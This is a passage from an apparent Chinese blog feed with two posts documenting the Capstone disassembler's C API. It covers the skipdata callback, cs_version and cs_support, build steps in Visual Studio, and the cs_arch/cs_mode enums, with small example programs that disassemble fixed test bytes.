<code>cs_vsnprintf_t cs_vsnprintf = vsnprintf;</code>，使用默认vsnprintf</p><h3 id="cs-skipdata-cb-t"><a href="#cs-skipdata-cb-t" class="headerlink" title="cs_skipdata_cb_t"></a>cs_skipdata_cb_t</h3><p>size_t (CAPSTONE_API <em>cs_skipdata_cb_t)(const uint8_t </em>code, size_t code_size, size_t offset, void *user_data);</p><p>SKIPDATA选项的用户自定义回调函数。</p><p>code:包含要分解的代码的输入缓冲区。和传递给cs_disasm()的缓冲区相同。<br>code_size:上面的code缓冲区的大小(以字节为单位)。<br>offset:上面提到的输入缓冲区code中当前检查字节的位置。<br>user_data:用户数据通过cs_opt_skipdata结构中的@user_data字段传递给cs_option()。<br>return:返回要跳过的字节数，或者0表示立即停止反汇编。</p><p>cs_skipdata_cb_t在<code>struct cs_opt_skipdata</code>中调用，下面来看一个例子<br>分析写在注释中<br><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"platform.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"capstone.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">platform</span> &#123;</span></span><br><span class="line">cs_arch arch;</span><br><span class="line">cs_mode mode;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>* code;</span><br><span class="line"><span class="keyword">size_t</span> size;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* comment;</span><br><span class="line">cs_opt_type opt_type;</span><br><span class="line">cs_opt_value opt_value;</span><br><span class="line">cs_opt_type opt_skipdata;</span><br><span class="line"><span class="keyword">size_t</span> skipdata;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">print_string_hex</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>* str, <span class="keyword">size_t</span> len)</span>  <span class="comment">//输出机器码</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>* c;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Code: "</span>);</span><br><span class="line"><span class="keyword">for</span> (c = str; c &lt; str + len; c++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0x%02x "</span>, *c &amp; <span class="number">0xff</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> X86_CODE32 <span class="meta-string">"\x8d\x4c\x32\x08\x01\xd8\x81\xc6\x34\x12\x00\x00\x00\x91\x92"</span>  <span class="comment">//测试用机器码</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> RANDOM_CODE <span class="meta-string">"\xed\x00\x00\x00\x00\x1a\x5a\x0f\x1f\xff\xc2\x09\x80\x00\x00\x00\x07\xf7\xeb\x2a\xff\xff\x7f\x57\xe3\x01\xff\xff\x7f\x57\xeb\x00\xf0\x00\x00\x24\xb2\x4f\x00\x78"</span></span></span><br><span class="line"></span><br><span class="line">cs_opt_skipdata skipdata = &#123;</span><br><span class="line"><span class="comment">// 把默认 "data" 描述符从 ".byte" 重命名为 "db"</span></span><br><span class="line"><span class="string">"db"</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">platform</span> <span class="title">platforms</span>[2] = &#123;</span>         <span class="comment">//以默认描述符和自定义描述符两种方式建立一个数组</span></span><br><span class="line">&#123;</span><br><span class="line">CS_ARCH_X86,</span><br><span class="line">CS_MODE_32,</span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">char</span>*)X86_CODE32,</span><br><span class="line"><span class="keyword">sizeof</span>(X86_CODE32) - <span class="number">1</span>,</span><br><span class="line"><span class="string">"X86 32 (Intel syntax) - Skip data"</span>,</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">CS_ARCH_X86,</span><br><span class="line">CS_MODE_32,</span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">char</span>*)X86_CODE32,</span><br><span class="line"><span class="keyword">sizeof</span>(X86_CODE32) - <span class="number">1</span>,</span><br><span class="line"><span class="string">"X86 32 (Intel syntax) - Skip data with custom mnemonic"</span>,</span><br><span class="line">CS_OPT_INVALID,</span><br><span class="line">CS_OPT_OFF,</span><br><span class="line">CS_OPT_SKIPDATA_SETUP,</span><br><span class="line">(<span class="keyword">size_t</span>)&amp; skipdata,</span><br><span class="line">&#125;,</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">csh handle;   <span class="comment">//建立capstone句柄</span></span><br><span class="line"><span class="keyword">uint64_t</span> address = <span class="number">0x1000</span>;  <span class="comment">//设置起始地址</span></span><br><span class="line">cs_insn* insn;  <span class="comment">//具体信息结构体</span></span><br><span class="line">cs_err err;  <span class="comment">//错误枚举</span></span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">size_t</span> count;  <span class="comment">//成功反汇编行数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(platforms) / <span class="keyword">sizeof</span>(platforms[<span class="number">0</span>]); i++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"****************\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Platform: %s\n"</span>, platforms[i].comment);</span><br><span class="line">err = cs_open(platforms[i].arch, platforms[i].mode, &amp;handle);  <span class="comment">//错误检查</span></span><br><span class="line"><span class="keyword">if</span> (err) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Failed on cs_open() with error returned: %u\n"</span>, err);</span><br><span class="line"><span class="built_in">abort</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (platforms[i].opt_type)</span><br><span class="line">cs_option(handle, platforms[i].opt_type, platforms[i].opt_value);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打开SKIPDATA 模式</span></span><br><span class="line">cs_option(handle, CS_OPT_SKIPDATA, CS_OPT_ON);</span><br><span class="line">cs_option(handle, platforms[i].opt_skipdata, platforms[i].skipdata);</span><br><span class="line"></span><br><span class="line">count = cs_disasm(handle, platforms[i].code, platforms[i].size, address, <span class="number">0</span>, &amp;insn);</span><br><span class="line"><span class="keyword">if</span> (count) &#123;</span><br><span class="line"><span class="keyword">size_t</span> j;</span><br><span class="line"></span><br><span class="line">print_string_hex(platforms[i].code, platforms[i].size);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Disasm:\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; count; j++) &#123;  <span class="comment">//输出汇编</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0x%"</span> PRIx64 <span class="string">":\t%s\t\t%s\n"</span>,</span><br><span class="line">insn[j].address, insn[j].mnemonic, insn[j].op_str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 最后一行代码后打印偏移</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0x%"</span> PRIx64 <span class="string">":\n"</span>, insn[j - <span class="number">1</span>].address + insn[j - <span class="number">1</span>].size);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 释放cs_disasm()申请的内存</span></span><br><span class="line">cs_free(insn, count);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"****************\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Platform: %s\n"</span>, platforms[i].comment);</span><br><span class="line">print_string_hex(platforms[i].code, platforms[i].size);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"ERROR: Failed to disasm given code!\n"</span>);</span><br><span class="line"><span class="built_in">abort</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line">cs_close(&amp;handle);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">test();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>运行结果如下，可以看出，默认的 .byte数据类型被改为db描述符<br><img src="https://i.loli.net/2019/07/21/5d3457518e35444335.jpg" alt></p><h3 id="cs-version"><a href="#cs-version" class="headerlink" title="cs_version"></a>cs_version</h3><p><code>unsigned int CAPSTONE_API cs_version(int *major, int *minor);</code></p><p>用来输出capstone版本号<br>参数<br>major: API主版本<br>minor: API次版本<br>return: 返回主次版本的16进制，如4.0版本返回 0x0400</p><p>通过分析源码发现<br><img src="https://i.loli.net/2019/07/21/5d345fe61e3c630129.jpg" alt></p><p><img src="https://i.loli.net/2019/07/21/5d34602a326f528259.jpg" alt><br>该版本定义于cs.c中，编译后不可更改，不接受自定义版本</p><p>示例1：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"platform.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"capstone.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> cs_version(<span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> version = test();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%X"</span>, version);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出<br><img src="https://i.loli.net/2019/07/21/5d3465239ff2d14595.jpg" alt></p><p>示例2，强行修改版本：</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"platform.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"capstone.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> ma[] = &#123; <span class="number">5</span> &#125;;</span><br><span class="line"><span class="keyword">int</span> mi[] = &#123; <span class="number">6</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> cs_version(ma, mi);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> version = test();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%X"</span>, version);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出：<br><img src="https://i.loli.net/2019/07/21/5d3465bc7716b49405.jpg" alt><br>可以看到并不能改变</p><h3 id="cs-support"><a href="#cs-support" class="headerlink" title="cs_support"></a>cs_support</h3><p>bool CAPSTONE_API cs_support(int query);</p><p>用来检查capstone库是否支持参数输入的架构或处于某编译选项<br>通过查看源码得知，共有四种查询参数</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> CAPSTONE_API <span class="title">cs_support</span><span class="params">(<span class="keyword">int</span> query)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (query == CS_ARCH_ALL)</span><br><span class="line"><span class="keyword">return</span> all_arch == ((<span class="number">1</span> &lt;&lt; CS_ARCH_ARM) | (<span class="number">1</span> &lt;&lt; CS_ARCH_ARM64) |</span><br><span class="line">(<span class="number">1</span> &lt;&lt; CS_ARCH_MIPS) | (<span class="number">1</span> &lt;&lt; CS_ARCH_X86) |</span><br><span class="line">(<span class="number">1</span> &lt;&lt; CS_ARCH_PPC) | (<span class="number">1</span> &lt;&lt; CS_ARCH_SPARC) |</span><br><span class="line">(<span class="number">1</span> &lt;&lt; CS_ARCH_SYSZ) | (<span class="number">1</span> &lt;&lt; CS_ARCH_XCORE) |</span><br><span class="line">(<span class="number">1</span> &lt;&lt; CS_ARCH_M68K) | (<span class="number">1</span> &lt;&lt; CS_ARCH_TMS320C64X) |</span><br><span class="line">(<span class="number">1</span> &lt;&lt; CS_ARCH_M680X) | (<span class="number">1</span> &lt;&lt; CS_ARCH_EVM));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)query &lt; CS_ARCH_MAX)</span><br><span class="line"><span class="keyword">return</span> all_arch &amp; (<span class="number">1</span> &lt;&lt; query);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (query == CS_SUPPORT_DIET) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CAPSTONE_DIET</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (query == CS_SUPPORT_X86_REDUCE) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(CAPSTONE_HAS_X86) &amp;&amp; defined(CAPSTONE_X86_REDUCE)</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// unsupported query</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>示例1(CS_ARCH_ALL，检查是否支持所有架构)：<br><img src="https://i.loli.net/2019/07/21/5d3469069954048775.jpg" alt></p><p>示例2(CS<em>ARCH</em>*，检查是否支持指定架构)<br><img src="https://i.loli.net/2019/07/21/5d34698a9ee7d33247.jpg" alt></p><p>示例3(检查是否处于DIET编译模式)：<br><img src="https://i.loli.net/2019/07/21/5d346a147b7e947704.jpg" alt></p><p>示例4(检查是否处于X86_REDUCE编译模式)：<br><img src="https://i.loli.net/2019/07/21/5d346a844b5b058873.jpg" alt>)</p><p>From <a href="https://kabeor.github.io/Capstone反汇编引擎数据类型及API分析及示例(二">https://kabeor.github.io/Capstone反汇编引擎数据类型及API分析及示例(二)/</a>/) bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Capstone反汇编引擎数据类型及API分析及示例-二&quot;&gt;&lt;a href=&quot;#Capstone反汇编引擎数据类型及API分析及示例-二&quot; class=&quot;headerlink&quot; title=&quot;Capstone反汇编引擎数据类型及API分析及示例(二)&quot;&gt;&lt;/a&gt;C
      
    
    </summary>
    
      <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="反汇编" scheme="https://kabeor.github.io/tags/%E5%8F%8D%E6%B1%87%E7%BC%96/"/>
    
  </entry>
  
  <entry>
    <title>Capstone反汇编引擎数据类型及API分析及示例(一)</title>
    <link href="https://kabeor.github.io/Capstone%E5%8F%8D%E6%B1%87%E7%BC%96%E5%BC%95%E6%93%8E%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E5%8F%8AAPI%E5%88%86%E6%9E%90%E5%8F%8A%E7%A4%BA%E4%BE%8B(%E4%B8%80)/"/>
    <id>https://kabeor.github.io/Capstone反汇编引擎数据类型及API分析及示例(一)/</id>
    <published>2019-07-20T07:14:11.341Z</published>
    <updated>2019-07-26T04:39:24.236Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Capstone反汇编引擎数据类型及API分析及示例-一"><a href="#Capstone反汇编引擎数据类型及API分析及示例-一" class="headerlink" title="Capstone反汇编引擎数据类型及API分析及示例(一)"></a>Capstone反汇编引擎数据类型及API分析及示例(一)</h1><blockquote><p>本文由本人首发于先知社区 <a href="https://xz.aliyun.com/t/5753" target="_blank" rel="noopener">https://xz.aliyun.com/t/5753</a></p></blockquote><p>最近准备用开源的反汇编引擎做个项目，研究了OllyDebug的ODDisasm，disasm与assembl部分代码的思想都很值得学习，但毕竟是2000年的产物，指令集只支持x86，也没有对语义的深度分析，于是转向了对Capstone的研究。</p><p>Capstone反汇编引擎可以说是如今世界上最优秀的反汇编引擎，IDA，Radare2，Qemu等著名项目都使用了Capstone Engine，所以选择它来开发是一个不错的选择。<br>但在开发时发现官方并未给出详细API文档，网上也没有类似的分析，因此想到自己阅读源码和试验，由此写出了一个简单的非官方版本的API手册，希望能与大家分享。</p><h2 id="0x0-开发准备"><a href="#0x0-开发准备" class="headerlink" title="0x0 开发准备"></a>0x0 开发准备</h2><p>  Capstone官网： <a href="http://www.capstone-engine.org" target="_blank" rel="noopener">http://www.capstone-engine.org</a></p><h3 id="自行编译lib和dll方法"><a href="#自行编译lib和dll方法" class="headerlink" title="自行编译lib和dll方法"></a>自行编译lib和dll方法</h3><p>  源码： <a href="https://github.com/aquynh/capstone/archive/4.0.1.zip" target="_blank" rel="noopener">https://github.com/aquynh/capstone/archive/4.0.1.zip</a></p><p>  下载后解压<br>  文件结构如下：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">   .                   &lt;- 主要引擎core engine + README + 编译文档COMPILE.TXT 等</span><br><span class="line">├── arch            &lt;- 各语言反编译支持的代码实现</span><br><span class="line">│   ├── AArch64     &lt;- ARM64 (aka ARMv8) 引擎</span><br><span class="line">│   ├── ARM         &lt;- ARM 引擎</span><br><span class="line">│   ├── EVM         &lt;- Ethereum 引擎</span><br><span class="line">│   ├── M680X       &lt;- M680X 引擎</span><br><span class="line">│   ├── M68K        &lt;- M68K 引擎</span><br><span class="line">│   ├── Mips        &lt;- Mips 引擎</span><br><span class="line">│   ├── PowerPC     &lt;- PowerPC 引擎</span><br><span class="line">│   ├── Sparc       &lt;- Sparc 引擎</span><br><span class="line">│   ├── SystemZ     &lt;- SystemZ 引擎</span><br><span class="line">│   ├── TMS320C64x  &lt;- TMS320C64x 引擎</span><br><span class="line">│   ├── X86         &lt;- X86 引擎</span><br><span class="line">│   └── XCore       &lt;- XCore 引擎</span><br><span class="line">├── bindings        &lt;- 中间件</span><br><span class="line">│   ├── java        &lt;- Java 中间件 + 测试代码</span><br><span class="line">│   ├── ocaml       &lt;- Ocaml 中间件 + 测试代码</span><br><span class="line">│   └── python      &lt;- Python 中间件 + 测试代码</span><br><span class="line">├── contrib         &lt;- 社区代码</span><br><span class="line">├── cstool          &lt;- Cstool 检测工具源码</span><br><span class="line">├── docs            &lt;- 文档，主要是capstone的实现思路</span><br><span class="line">├── include         &lt;- C头文件</span><br><span class="line">├── msvc            &lt;- Microsoft Visual Studio 支持（Windows）</span><br><span class="line">├── packages        &lt;- Linux/OSX/BSD包</span><br><span class="line">├── windows         &lt;- Windows 支持(Windows内核驱动编译)</span><br><span class="line">├── suite           &lt;- Capstone开发测试工具</span><br><span class="line">├── tests           &lt;- C语言测试用例</span><br><span class="line">└── xcode           &lt;- Xcode 支持 (MacOSX 编译)</span><br></pre></td></tr></table></figure></p><p>下面演示Windows10使用Visual Studio2019编译</p><p>复制msvc文件夹到一个比较清爽的位置（强迫症专用），内部结构如下：</p><p><img src="https://i.loli.net/2019/07/20/5d32b771e4c0118081.jpg" alt></p><p>VS打开capstone.sln项目文件，解决方案自动载入这些</p><p><img src="https://i.loli.net/2019/07/20/5d32b810db76b87698.jpg" alt></p><p>可以看到支持的所有语言都在这里了，如果都需要的话，直接编译就好了，只需要其中几种，则右键解决方案-&gt;属性-&gt;配置属性  如下</p><p><img src="https://i.loli.net/2019/07/20/5d32b92a26e1328865.jpg" alt></p><p>生成选项中勾选你需要的支持项即可<br>编译后会在当前文件夹Debug目录下生成capstone.lib静态编译库和capstone.dll动态库这样就可以开始使用Capstone进行开发了</p><p>如果不想自己编译，官方也提供了官方编译版本<br>Win32： <a href="https://github.com/aquynh/capstone/releases/download/4.0.1/capstone-4.0.1-win32.zip" target="_blank" rel="noopener">https://github.com/aquynh/capstone/releases/download/4.0.1/capstone-4.0.1-win32.zip</a><br>Win64： <a href="https://github.com/aquynh/capstone/releases/download/4.0.1/capstone-4.0.1-win64.zip" target="_blank" rel="noopener">https://github.com/aquynh/capstone/releases/download/4.0.1/capstone-4.0.1-win64.zip</a></p><p>选x32或x64将影响后面开发的位数</p><h3 id="引擎调用测试"><a href="#引擎调用测试" class="headerlink" title="引擎调用测试"></a>引擎调用测试</h3><p>新建一个VS项目，将..\capstone-4.0.1\include\capstone中的头文件以及编译好的lib和dll文件全部拷贝到新建项目的主目录下</p><p><img src="https://i.loli.net/2019/07/20/5d32bbbde025889046.jpg" alt></p><p>在VS解决方案中，头文件添加现有项capstone.h，资源文件中添加capstone.lib，重新生成解决方案</p><p><img src="https://i.loli.net/2019/07/20/5d32bc284c4e175661.jpg" alt></p><p>那么现在来测试一下我们自己的capstone引擎吧</p><p>主文件写入如下代码</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cinttypes&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"capstone.h"</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CODE <span class="meta-string">"\x55\x48\x8b\x05\xb8\x13\x00\x00"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">csh handle;</span><br><span class="line">cs_insn* insn;</span><br><span class="line"><span class="keyword">size_t</span> count;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (cs_open(CS_ARCH_X86, CS_MODE_64, &amp;handle)) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"ERROR: Failed to initialize engine!\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">count = cs_disasm(handle, (<span class="keyword">unsigned</span> <span class="keyword">char</span>*)CODE, <span class="keyword">sizeof</span>(CODE) - <span class="number">1</span>, <span class="number">0x1000</span>, <span class="number">0</span>, &amp;insn);</span><br><span class="line"><span class="keyword">if</span> (count) &#123;</span><br><span class="line"><span class="keyword">size_t</span> j;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; count; j++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0x%"</span><span class="string">"Ix"</span><span class="string">":\t%s\t\t%s\n"</span>, insn[j].address, insn[j].mnemonic, insn[j].op_str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cs_free(insn, count);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"ERROR: Failed to disassemble given code!\n"</span>);</span><br><span class="line"></span><br><span class="line">cs_close(&amp;handle);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>事实上这是官方给出的C语言开发唯一几个例子之一，但注意到代码cs_open(CS_ARCH_X86, CS_MODE_64, &amp;handle)，测试的是archx64的反编译，因此编译选项也需要设置为x64，除此以外，如果你的项目像我一样是c++开发，那么printf(“0x%””Ix””:\t%s\t\t%s\n”, insn[j].address, insn[j].mnemonic, insn[j].op_str);处官方给出的”0x%”PRIx64”:\t%s\t\t%s\n”应修改为我这里的”0x%””Ix””:\t%s\t\t%s\n”，这是inttypes支持问题。</p><p>运行结果<br><img src="https://i.loli.net/2019/07/20/5d32ca5adbd7040022.jpg" alt></p><h2 id="0x1-数据类型及API分析"><a href="#0x1-数据类型及API分析" class="headerlink" title="0x1 数据类型及API分析"></a>0x1 数据类型及API分析</h2><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><h4 id="csh"><a href="#csh" class="headerlink" title="csh"></a>csh</h4><p>用于生成调用capstone API的句柄<br><code>size_t csh</code> </p><blockquote><p>用法： <code>csh handle;</code></p></blockquote><h4 id="cs-arch"><a href="#cs-arch" class="headerlink" title="cs_arch"></a>cs_arch</h4><p>架构选择</p> <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">enum</span> cs_arch &#123;</span><br><span class="line">CS_ARCH_ARM = <span class="number">0</span>,<span class="comment">///&lt; ARM 架构 (包括 Thumb, Thumb-2)</span></span><br><span class="line">CS_ARCH_ARM64,<span class="comment">///&lt; ARM-64, 也叫 AArch64</span></span><br><span class="line">CS_ARCH_MIPS,<span class="comment">///&lt; Mips 架构</span></span><br><span class="line">   CS_ARCH_X86,<span class="comment">///&lt; X86 架构 (包括 x86 &amp; x86-64)</span></span><br><span class="line">CS_ARCH_PPC,<span class="comment">///&lt; PowerPC 架构</span></span><br><span class="line">CS_ARCH_SPARC,<span class="comment">///&lt; Sparc 架构</span></span><br><span class="line">CS_ARCH_SYSZ,<span class="comment">///&lt; SystemZ 架构</span></span><br><span class="line">CS_ARCH_XCORE,<span class="comment">///&lt; XCore 架构</span></span><br><span class="line">CS_ARCH_M68K,<span class="comment">///&lt; 68K 架构</span></span><br><span class="line">CS_ARCH_TMS320C64X,<span class="comment">///&lt; TMS320C64x 架构</span></span><br><span class="line">CS_ARCH_M680X,<span class="comment">///&lt; 680X 架构</span></span><br><span class="line">CS_ARCH_EVM,<span class="comment">///&lt; Ethereum 架构</span></span><br><span class="line">CS_ARCH_MAX,</span><br><span class="line">CS_ARCH_ALL = <span class="number">0xFFFF</span>, <span class="comment">// All 架构 - for cs_support()</span></span><br><span class="line">&#125; cs_arch;</span><br></pre></td></tr></table></figure><blockquote><p>用法：API中cs_arch参数填入枚举内容，如API中cs_open(cs_arch arch, cs_mode mode, csh *handle);第一个参数填CS_ARCH_X86则支持X86 架构</p></blockquote><h4 id="cs-mode"><a href="#cs-mode" class="headerlink" title="cs_mode"></a>cs_mode</h4><p>模式选择</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">enum</span> cs_mode &#123;</span><br><span class="line">CS_MODE_LITTLE_ENDIAN = <span class="number">0</span>,<span class="comment">///&lt; little-endian 模式 (default 模式)</span></span><br><span class="line">CS_MODE_ARM = <span class="number">0</span>,<span class="comment">///&lt; 32-bit ARM</span></span><br><span class="line">CS_MODE_16 = <span class="number">1</span> &lt;&lt; <span class="number">1</span>,<span class="comment">///&lt; 16-bit 模式 (X86)</span></span><br><span class="line">CS_MODE_32 = <span class="number">1</span> &lt;&lt; <span class="number">2</span>,<span class="comment">///&lt; 32-bit 模式 (X86)</span></span><br><span class="line">CS_MODE_64 = <span class="number">1</span> &lt;&lt; <span class="number">3</span>,<span class="comment">///&lt; 64-bit 模式 (X86, PPC)</span></span><br><span class="line">CS_MODE_THUMB = <span class="number">1</span> &lt;&lt; <span class="number">4</span>,<span class="comment">///&lt; ARM's Thumb 模式, 包括 Thumb-2</span></span><br><span class="line">CS_MODE_MCLASS = <span class="number">1</span> &lt;&lt; <span class="number">5</span>,<span class="comment">///&lt; ARM's Cortex-M 系列</span></span><br><span class="line">CS_MODE_V8 = <span 